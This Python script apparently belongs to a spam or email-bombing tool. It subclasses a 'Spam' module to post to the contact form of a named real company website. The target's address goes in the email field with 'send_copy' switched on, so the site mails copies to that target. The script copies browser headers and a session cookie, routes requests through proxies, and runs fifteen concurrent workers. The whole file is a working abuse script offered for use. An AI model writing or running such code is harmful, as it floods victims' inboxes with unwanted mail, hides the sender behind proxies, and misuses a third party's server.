from os.path import basename

import requests

from module import Spam

cookies = {
    '356b0bd0ac315b472c0fbc37776114a5': '08a2d92a7db5a675e24da1d11a10e4d0',
}

headers = {
    'authority': 'agileinfotechsolutions.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '356b0bd0ac315b472c0fbc37776114a5=08a2d92a7db5a675e24da1d11a10e4d0',
    'origin': 'https://agileinfotechsolutions.com',
    'referer': 'https://agileinfotechsolutions.com/index.php/contact-us2',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'message': self.get_text(),
            'subject': self.get_text(),
            'date': '2023/03/02 12:43',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '144',
        }

        response = requests.post('https://agileinfotechsolutions.com/index.php/contact-us2', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Your email has been sent.')
    res = spam.send_post()
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
